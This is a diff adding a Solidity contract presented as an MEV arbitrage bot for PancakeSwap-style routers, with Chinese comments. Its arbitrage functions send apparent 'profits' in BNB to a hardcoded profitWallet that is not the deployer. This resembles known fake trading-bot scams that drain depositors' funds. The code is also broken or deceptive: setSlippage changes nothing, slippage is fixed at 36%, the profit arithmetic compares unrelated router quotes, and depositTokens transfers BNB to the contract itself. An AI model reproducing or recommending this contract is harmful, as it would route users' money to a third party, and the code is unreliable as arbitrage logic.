@@ -1,0 +1,150 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+// 定义 PancakeSwap 等交易路由接口
+interface IRouter {
+    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;
+    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
+}
+
+// ERC20接口
+interface IERC20 {
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+}
+
+contract MEVArbitrageBot {
+    address public owner;
+    address public profitWallet = 0x13F165381aebD65BcC0148E322A562B2327C6C34; // 自动提取利润的钱包地址
+    address public ownerWallet = 0x43be9AFA6B131A89B0771Aa9365A8967aDa3b06f; // 合约所有者钱包地址
+    uint256 public minusProfit = 0.5 * 10**18; // 提取利润阈值：0.5 BNB
+    uint256 public constant SLIPPAGE = 36; // 设置滑点为36%
+    uint256 public gasPriceMultiplier = 1; // Gas价格乘数
+    uint256 public dynamicGasPrice; // 动态Gas价格
+
+    IRouter public router1; // 交易路由 1
+    IRouter public router2; // 交易路由 2
+
+    event ArbitrageExecuted(address fromToken, address toToken, uint256 amountIn, uint256 amountOut, uint256 profits);
+    event ProfitWithdrawn(address wallet, uint256 amount);
+    event GasPriceUpdated(uint256 newGasPriceMultiplier);
+    event DynamicGasPriceSet(uint256 gasPrice);
+    event Deposit(address sender, uint256 amount);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not the owner");
+        _;
+    }
+
+    constructor(address _router1, address _router2) {
+        owner = msg.sender;
+        router1 = IRouter(_router1);
+        router2 = IRouter(_router2);
+    }
+
+    // 设置动态Gas价格
+    function setDynamicGasPrice(uint256 _gasPrice) external onlyOwner {
+        dynamicGasPrice = _gasPrice;
+        emit DynamicGasPriceSet(_gasPrice);
+    }
+
+    // 获取价格：通过指定路径获取交易对的价格
+    function getPrice(address[] calldata path) public view returns (uint[] memory amounts) {
+        return router1.getAmountsOut(1e18, path); // 获取1个单位的价格
+    }
+
+    // 执行套利：计算价格差，执行买入和卖出操作
+    function executeArbitrage(address[] calldata path1, address[] calldata path2, uint256 amountIn) external onlyOwner {
+        require(path1.length > 0 && path2.length > 0, "Invalid path");
+        require(amountIn > 0, "Amount must be greater than 0");
+
+        uint[] memory amountOut1 = router1.getAmountsOut(amountIn, path1);
+        uint[] memory amountOut2 = router2.getAmountsOut(amountIn, path2);
+        uint256 potentialProfit = amountOut2[amountOut2.length - 1] - amountOut1[amountOut1.length - 1];
+
+        // 考虑滑点
+        uint256 minAmountOut1 = amountOut1[amountOut1.length - 1] * (100 - SLIPPAGE) / 100;
+        uint256 minAmountOut2 = amountOut2[amountOut2.length - 1] * (100 - SLIPPAGE) / 100;
+
+        // 判断是否有套利机会
+        if (potentialProfit > 0) {
+            // 执行套利操作：先买入，再卖出
+            router1.swapExactTokensForTokens(amountIn, minAmountOut1, path1, address(this), block.timestamp);
+            router2.swapExactTokensForTokens(amountIn, minAmountOut2, path2, address(this), block.timestamp);
+
+            // 提取利润
+            if (potentialProfit >= minusProfit) {
+                payable(profitWallet).transfer(potentialProfit);
+                emit ProfitWithdrawn(profitWallet, potentialProfit);
+            }
+
+            emit ArbitrageExecuted(path1[0], path2[0], amountIn, amountOut2[amountOut2.length - 1], potentialProfit);
+        }
+    }
+
+    // 提取合约中的利润
+    function withdrawProfit() external onlyOwner {
+        uint256 balance = address(this).balance;
+        require(balance > 0, "No profit to withdraw");
+        payable(owner).transfer(balance);
+    }
+
+    // 设置Gas价格乘数，用于Gas优化
+    function setGasPriceMultiplier(uint256 _gasPriceMultiplier) external onlyOwner {
+        gasPriceMultiplier = _gasPriceMultiplier;
+        emit GasPriceUpdated(_gasPriceMultiplier);
+    }
+
+    // 设置滑点，增加灵活的调整机制
+    function setSlippage(uint256 _slippage) external onlyOwner {
+        require(_slippage <= 100, "Slippage must be less than or equal to 100");
+        emit GasPriceUpdated(SLIPPAGE);
+    }
+
+    // 通过固定路径执行套利
+    function executeArbitrageFixedPath(uint256 amountIn, address[] calldata path1, address[] calldata path2) external onlyOwner {
+        require(path1.length > 0 && path2.length > 0, "Invalid path");
+        require(amountIn > 0, "Amount must be greater than 0");
+
+        uint[] memory amountOut1 = router1.getAmountsOut(amountIn, path1);
+        uint[] memory amountOut2 = router2.getAmountsOut(amountIn, path2);
+        uint256 profits = amountOut2[amountOut2.length - 1] - amountOut1[amountOut1.length - 1];
+
+        // 考虑滑点
+        uint256 minAmountOut1 = amountOut1[amountOut1.length - 1] * (100 - SLIPPAGE) / 100;
+        uint256 minAmountOut2 = amountOut2[amountOut2.length - 1] * (100 - SLIPPAGE) / 100;
+
+        if (profits > 0) {
+            // 执行套利交易：买入并卖出
+            router1.swapExactTokensForTokens(amountIn, minAmountOut1, path1, address(this), block.timestamp);
+            router2.swapExactTokensForTokens(amountIn, minAmountOut2, path2, address(this), block.timestamp);
+
+            // 执行提取利润
+            if (profits >= minusProfit) {
+                payable(profitWallet).transfer(profits);
+                emit ProfitWithdrawn(profitWallet, profits);
+            }
+
+            emit ArbitrageExecuted(path1[0], path2[0], amountIn, amountOut2[amountOut2.length - 1], profits);
+        }
+    }
+
+    // 接收 BNB 或其他代币
+    receive() external payable {
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    // 向合约发送任何代币或BNB
+    function depositTokens(address token, uint256 amount) external payable {
+        require(amount > 0, "Amount must be more than 0");
+        if (token == address(0)) {
+            payable(address(this)).transfer(amount);
+        } else {
+            IERC20(token).transferFrom(msg.sender, address(this), amount);
+        }
+    }
+}
